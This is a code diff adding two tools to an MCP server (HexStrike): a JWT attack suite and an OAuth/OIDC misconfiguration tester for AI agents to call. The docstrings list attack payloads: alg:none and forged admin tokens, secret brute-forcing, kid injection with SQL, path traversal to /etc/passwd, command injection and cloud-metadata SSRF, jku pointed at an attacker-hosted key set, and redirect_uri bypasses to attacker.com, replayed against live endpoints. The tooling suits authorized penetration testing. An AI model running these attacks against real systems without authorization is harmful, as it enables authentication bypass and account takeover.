@@ -8116,6 +8116,394 @@ def setup_mcp_server(hexstrike_client: HexStrikeClient) -> FastMCP:
         )
         return {"output": "\n".join(lines), "data": result}
 
+    @mcp.tool()
+    def jwt_attack(
+        token:              str,
+        endpoint:           str  = "",
+        public_key_pem:     str  = "",
+        attacker_jwks_url:  str  = "",
+        extra_wordlist:     Optional[List[str]] = None,
+        run_brute:          bool = True,
+        run_alg_none:       bool = True,
+        run_kid:            bool = True,
+        run_confusion:      bool = True,
+        run_exp:            bool = True,
+        run_jku:            bool = True,
+        run_jwk:            bool = True,
+    ) -> Dict[str, Any]:
+        """
+        Full JWT attack suite — 8 attack techniques + live endpoint replay.
+
+        Always runs — Token Decode & Inspection:
+          Decodes header and payload without verification. Flags:
+          alg:none · HMAC (brute-force candidate) · asymmetric (confusion candidate)
+          expired / far-future exp · missing exp (never expires) · missing aud/iss
+          dangerous header claims: kid, jku, x5u, jwk
+
+        Attack 1 — alg:none (run_alg_none):
+          Generates 5×3=15 variants with algorithm set to none/None/NONE/nOnE/NoNe
+          and the signature stripped. Tests trailing dot, no dot, double dot variants.
+          Replays against endpoint if provided.
+
+        Attack 2 — Weak Secret Brute-Force (run_brute, HS* tokens only):
+          Tests 34 common HMAC secrets against the token's signature.
+          On success: re-signs a forged admin token (role:admin, admin:true, exp+1yr).
+          Built-in wordlist: secret, password, changeme, jwt_secret, HS256, admin, etc.
+          Provide extra_wordlist for application-specific secrets.
+
+        Attack 3 — RS256 → HS256 Algorithm Confusion (run_confusion, RS*/ES* tokens):
+          Signs payload with the server's RSA public key as the HMAC-SHA256 secret.
+          Server configured to verify RS256 may accept HS256 signed with pubkey.
+          Requires public_key_pem (fetch from /.well-known/jwks.json).
+
+        Attack 4 — kid Header Injection (run_kid):
+          10 kid payloads: SQL UNION/OR/sleep, path traversal (../../dev/null,
+          ../../../../etc/passwd), null byte, OS command injection (| id #),
+          SSRF via kid URL (AWS metadata endpoint).
+
+        Attack 5 — jku / x5u URL Injection (run_jku):
+          Replaces jku/x5u header with attacker_jwks_url. Includes JWKS template
+          to host at that URL. Sign with corresponding private key.
+          Requires attacker_jwks_url (e.g. your JS-Tap tunnel URL + /jwks.json).
+
+        Attack 6 — Embedded JWK (run_jwk):
+          Embeds a self-signed symmetric JWK directly in the token header.
+          Vulnerable parsers accept the embedded key as the verification key.
+
+        Attack 7 — exp / nbf / iat Manipulation (run_exp):
+          4 variants: remove exp entirely · set exp 10 years out · set nbf in far
+          future (should fail) · zero iat (epoch). Signs with secret if brute found,
+          otherwise uses alg:none fallback.
+
+        Endpoint Replay (endpoint):
+          After generating attack tokens, replays alg:none variants and forged
+          admin token against the target endpoint to confirm exploitation.
+          Uses both Authorization: Bearer and X-Auth-Token headers.
+
+        Args:
+            token:             JWT token to attack (eyJ... format)
+            endpoint:          Target API endpoint for live replay (optional)
+            public_key_pem:    Server's RSA public key in PEM format (for RS256→HS256)
+            attacker_jwks_url: Attacker-controlled JWKS URL (for jku injection)
+            extra_wordlist:    Additional secrets to test in brute-force
+            run_brute:         Run HMAC secret brute-force (default True)
+            run_alg_none:      Generate alg:none variants (default True)
+            run_kid:           Generate kid injection variants (default True)
+            run_confusion:     Run RS256→HS256 confusion (default True)
+            run_exp:           Generate exp/nbf manipulation variants (default True)
+            run_jku:           Generate jku/x5u injection token (default True, needs attacker_jwks_url)
+            run_jwk:           Generate embedded JWK token (default True)
+
+        Returns:
+            Decoded header/payload, all attack tokens, brute-force result,
+            replay results, and severity summary.
+        """
+        resp = requests.post(
+            f"{BASE_URL}/api/tools/jwt/attack",
+            json={
+                "token":             token,
+                "endpoint":          endpoint,
+                "public_key_pem":    public_key_pem,
+                "attacker_jwks_url": attacker_jwks_url,
+                "extra_wordlist":    extra_wordlist,
+                "run_brute":         run_brute,
+                "run_alg_none":      run_alg_none,
+                "run_kid":           run_kid,
+                "run_confusion":     run_confusion,
+                "run_exp":           run_exp,
+                "run_jku":           run_jku,
+                "run_jwk":           run_jwk,
+            },
+            timeout=120,
+        )
+        result  = resp.json()
+        summary = result.get("summary", {})
+        decoded = result.get("decoded", {})
+        cracked = result.get("brute_force", {})
+
+        lines = [
+            f"🔐 JWT Attack Suite",
+            f"   Algorithm   : {summary.get('algorithm', '?')}",
+            f"   🚨 CRITICAL : {summary.get('criticals', 0)}",
+            f"   🔑 Cracked   : {'YES' if cracked.get('cracked') else 'no'}",
+            f"   alg:none    : {summary.get('alg_none_variants', 0)} variants",
+            f"   kid payloads: {summary.get('kid_variants', 0)}",
+            f"   exp payloads: {summary.get('exp_variants', 0)}",
+            f"   ⏱  Duration : {summary.get('duration_sec', 0)}s",
+            "",
+        ]
+
+        # Decode issues
+        if decoded.get("issues"):
+            lines.append("📋 TOKEN ISSUES:")
+            for i in decoded["issues"]:
+                sev   = i.get("severity", "INFO")
+                emoji = {"CRITICAL": "🚨", "HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🔵", "INFO": "ℹ️"}.get(sev, "ℹ️")
+                lines.append(f"  {emoji} [{sev}] {i.get('issue','')}")
+            lines.append("")
+
+        # Brute force result
+        if cracked.get("cracked"):
+            lines.append("🚨 SECRET CRACKED!")
+            lines.append(f"   Secret  : {cracked.get('secret','?')}")
+            lines.append(f"   Alg     : {cracked.get('algorithm','?')}")
+            lines.append(f"   Forged  : {cracked.get('forged_admin_token','')[:80]}...")
+            lines.append("")
+        elif cracked.get("cracked") is False:
+            lines.append(f"✅ Secret not in wordlist ({cracked.get('wordlist_size',0)} tried).")
+            lines.append("")
+
+        # RS256→HS256
+        confusion = result.get("rs256_hs256", {})
+        if confusion.get("applicable"):
+            lines.append("🚨 RS256→HS256 CONFUSION TOKEN:")
+            lines.append(f"   {confusion.get('confused_token','')[:80]}...")
+            lines.append("")
+
+        # jku injection
+        jku = result.get("jku_injection", {})
+        if jku.get("severity") == "CRITICAL":
+            lines.append(f"🚨 JKU INJECTION TOKEN ({jku.get('injection_header','?')}):")
+            lines.append(f"   JWKS URL : {jku.get('attacker_jwks_url','')}")
+            lines.append(f"   Token    : {jku.get('token','')[:80]}...")
+            lines.append(f"   → Host your JWKS at the URL above to complete the attack.")
+            lines.append("")
+
+        # jwk embedded
+        jwk = result.get("jwk_embedded", {})
+        if jwk.get("token"):
+            lines.append(f"🚨 EMBEDDED JWK TOKEN:")
+            lines.append(f"   {jwk.get('token','')[:80]}...")
+            lines.append("")
+
+        # alg:none — show first token only
+        alg_none = result.get("alg_none", [])
+        if alg_none:
+            lines.append(f"⚠️  ALG:NONE VARIANTS ({len(alg_none)}) — first:")
+            first = alg_none[0]
+            lines.append(f"   alg='{first.get('alg_variant','?')}' : {first.get('token','')[:80]}...")
+            lines.append("")
+
+        # Replay results
+        replay = result.get("replay_tests", {})
+        if replay:
+            lines.append("🎯 REPLAY RESULTS:")
+            for name, r in replay.items():
+                status = "✅ ACCEPTED" if r.get("accepted") else f"❌ {r.get('status','?')}"
+                lines.append(f"   {name:30s} → {status}")
+            lines.append("")
+
+        logger.info(
+            f"{HexStrikeColors.SUCCESS}🔐 JWT: {summary.get('criticals',0)} critical, "
+            f"cracked={cracked.get('cracked',False)}{HexStrikeColors.RESET}"
+        )
+        return {"output": "\n".join(lines), "data": result}
+
+    @mcp.tool()
+    def oauth_test(
+        target:                 str,
+        authorization_endpoint: str  = "",
+        token_endpoint:         str  = "",
+        client_id:              str  = "",
+        client_secret:          str  = "",
+        redirect_uri:           str  = "",
+        authorization_code:     str  = "",
+        run_discovery:          bool = True,
+        run_redirect_bypass:    bool = True,
+        run_state_csrf:         bool = True,
+        run_pkce:               bool = True,
+        run_implicit:           bool = True,
+        run_scope_creep:        bool = True,
+        run_token_checks:       bool = True,
+        run_code_reuse:         bool = False,
+    ) -> Dict[str, Any]:
+        """
+        OAuth 2.0 / OIDC misconfiguration assessment — 8 attack categories.
+
+        Check 1 — OIDC/OAuth Discovery (run_discovery):
+          Probes 8 well-known paths (/.well-known/openid-configuration,
+          /.well-known/oauth-authorization-server, /oauth/keys, etc.)
+          Auto-extracts authorization_endpoint and token_endpoint for subsequent checks.
+          Flags: HTTP endpoints, implicit/fragment response types, password grant,
+          missing PKCE advertisement, no introspection endpoint, fragment response_mode.
+
+        Check 2 — redirect_uri Bypass (run_redirect_bypass):
+          Tests 14 bypass techniques against the authorization endpoint:
+            {legit}@attacker.com  ·  {legit}%40attacker.com  ·  attacker.com#{legit}
+            {legit}.attacker.com  ·  /path/../../attacker.com  ·  {base}#.attacker.com
+            {base}:80@attacker.com  ·  encoded-slash variants  ·  null byte injection
+            param pollution (&redirect_uri=https://attacker.com) · + more
+          Confirms acceptance by checking Location header in 302 response.
+
+        Check 3 — State Parameter CSRF (run_state_csrf):
+          Tests: missing state · empty state · predictable/static state value.
+          Any authorization code returned without state enforcement is a CSRF risk.
+
+        Check 4 — PKCE Downgrade (run_pkce):
+          Sends authorization code request without code_challenge to test if
+          PKCE is enforced. If a code is returned without it, auth codes can
+          be intercepted and exchanged without the verifier.
+
+        Check 5 — Implicit Flow Token Leakage (run_implicit):
+          Requests response_type=token to test implicit grant. If access_token
+          appears in the redirect Location fragment it leaks in browser history,
+          Referer headers, and server logs.
+
+        Check 6 — Scope Creep (run_scope_creep):
+          Requests 18 over-privileged scopes (admin, superuser, *, read:all,
+          write:all, GCP cloud-platform, Azure .default, etc.) and checks which
+          are accepted without error.
+
+        Check 7 — Token Endpoint Misconfig (run_token_checks):
+          4 checks: HTTP token endpoint · client_secret in URL · unauthenticated
+          code exchange (no client auth) · client_credentials without secret ·
+          ROPC (password grant) with admin/password credentials.
+
+        Check 8 — Authorization Code Reuse (run_code_reuse):
+          Exchanges the provided authorization_code twice — if second exchange
+          succeeds the code is reusable (replay attack). Disabled by default
+          as it consumes a real authorization code.
+
+        Args:
+            target:                 OAuth/OIDC provider base URL (e.g. https://auth.example.com)
+            authorization_endpoint: Override auto-discovered auth endpoint
+            token_endpoint:         Override auto-discovered token endpoint
+            client_id:              OAuth client_id (required for most checks)
+            client_secret:          OAuth client_secret (optional, used for token endpoint checks)
+            redirect_uri:           Registered redirect URI (required for redirect bypass + PKCE)
+            authorization_code:     Real auth code for code_reuse check (optional)
+            run_discovery:          Probe OIDC discovery documents (default True)
+            run_redirect_bypass:    Test redirect_uri bypass payloads (default True)
+            run_state_csrf:         Test state parameter enforcement (default True)
+            run_pkce:               Test PKCE enforcement (default True)
+            run_implicit:           Test implicit flow token leakage (default True)
+            run_scope_creep:        Test over-privileged scope acceptance (default True)
+            run_token_checks:       Test token endpoint misconfigs (default True)
+            run_code_reuse:         Test authorization code reuse — consumes real code (default False)
+
+        Returns:
+            Discovery documents, all vulnerability findings with severity,
+            generated bypass URIs, and severity summary.
+        """
+        resp = requests.post(
+            f"{BASE_URL}/api/tools/oauth/test",
+            json={
+                "target":                 target,
+                "authorization_endpoint": authorization_endpoint,
+                "token_endpoint":         token_endpoint,
+                "client_id":              client_id,
+                "client_secret":          client_secret,
+                "redirect_uri":           redirect_uri,
+                "authorization_code":     authorization_code,
+                "run_discovery":          run_discovery,
+                "run_redirect_bypass":    run_redirect_bypass,
+                "run_state_csrf":         run_state_csrf,
+                "run_pkce":               run_pkce,
+                "run_implicit":           run_implicit,
+                "run_scope_creep":        run_scope_creep,
+                "run_token_checks":       run_token_checks,
+                "run_code_reuse":         run_code_reuse,
+            },
+            timeout=300,
+        )
+        result  = resp.json()
+        summary = result.get("summary", {})
+        critical= summary.get("critical", 0)
+        high    = summary.get("high", 0)
+        medium  = summary.get("medium", 0)
+
+        lines = [
+            f"🔒 OAuth/OIDC Tester — {target}",
+            f"   🚨 CRITICAL : {critical}",
+            f"   🔴 HIGH     : {high}",
+            f"   🟡 MEDIUM   : {medium}",
+            f"   Total issues: {summary.get('total_issues', 0)}",
+            f"   ⏱  Duration : {summary.get('duration_sec', 0)}s",
+            "",
+        ]
+
+        # Discovery
+        disc = result.get("discovery", {})
+        if disc.get("discovery_docs"):
+            lines.append(f"🔍 DISCOVERY DOCS FOUND ({disc['count']}):")
+            for doc in disc["discovery_docs"][:3]:
+                lines.append(f"   {doc['url']}")
+                for i in doc.get("issues", [])[:5]:
+                    sev   = i.get("severity", "INFO")
+                    emoji = {"CRITICAL": "🚨", "HIGH": "🔴", "MEDIUM": "🟡", "INFO": "ℹ️"}.get(sev, "ℹ️")
+                    lines.append(f"     {emoji} {i.get('issue','')}")
+            lines.append("")
+
+        # redirect_uri bypass
+        bypass = result.get("redirect_bypass", [])
+        accepted_bypasses = [b for b in bypass if b.get("accepted")]
+        if accepted_bypasses:
+            lines.append(f"🚨 REDIRECT_URI BYPASSES ACCEPTED ({len(accepted_bypasses)}):")
+            for b in accepted_bypasses[:5]:
+                lines.append(f"  🚨 [CRITICAL] {b.get('bypass_uri','')[:80]}")
+                lines.append(f"       Template : {b.get('template','')}")
+                lines.append(f"       Location : {b.get('location','')[:80]}")
+                lines.append("")
+        elif bypass:
+            lines.append(f"✅ redirect_uri bypass: {len(bypass)} tested, none accepted.")
+            lines.append("")
+
+        # State CSRF
+        state = result.get("state_csrf", {})
+        if state.get("issues"):
+            lines.append("🚨 STATE/CSRF ISSUES:")
+            for i in state["issues"]:
+                emoji = "🔴" if i.get("severity") == "HIGH" else "🟡"
+                lines.append(f"  {emoji} {i.get('issue','')}")
+            lines.append("")
+
+        # PKCE
+        pkce = result.get("pkce_downgrade", {})
+        if pkce.get("accepted"):
+            lines.append(f"🔴 PKCE NOT ENFORCED: {pkce.get('issue','')}")
+            lines.append("")
+
+        # Implicit flow
+        implicit = result.get("implicit_flow", {})
+        if implicit.get("token_in_fragment"):
+            lines.append(f"🔴 IMPLICIT FLOW: {implicit.get('issue','')}")
+            lines.append(f"   Location: {implicit.get('location','')[:100]}")
+            lines.append("")
+
+        # Scope creep
+        scopes = result.get("scope_creep", [])
+        if scopes:
+            lines.append(f"🔴 SCOPE CREEP — {len(scopes)} over-privileged scopes accepted:")
+            for s in scopes[:8]:
+                emoji = "🚨" if s.get("severity") == "CRITICAL" else "🔴"
+                lines.append(f"  {emoji} scope='{s.get('scope','')}' — {s.get('detail','')}")
+            lines.append("")
+
+        # Token endpoint
+        tok = result.get("token_endpoint", {})
+        if tok.get("issues"):
+            lines.append(f"🚨 TOKEN ENDPOINT ISSUES ({tok.get('severity_max','?')}):")
+            for i in tok["issues"]:
+                emoji = "🚨" if i.get("severity") == "CRITICAL" else "🔴"
+                lines.append(f"  {emoji} [{i.get('severity','?')}] {i.get('issue','')}")
+            lines.append("")
+
+        # Code reuse
+        code_r = result.get("code_reuse", {})
+        if code_r.get("reusable"):
+            lines.append(f"🔴 AUTH CODE REUSE: {code_r.get('issue','')}")
+            lines.append("")
+
+        if not critical and not high and not medium:
+            lines.append("✅ No major OAuth/OIDC misconfigurations detected.")
+            lines.append("   → Provide client_id + redirect_uri for deeper checks.")
+
+        logger.info(
+            f"{HexStrikeColors.SUCCESS}🔒 OAuth: {critical} crit, {high} high "
+            f"on {target}{HexStrikeColors.RESET}"
+        )
+        return {"output": "\n".join(lines), "data": result}
+
     return mcp
 
 def parse_args():
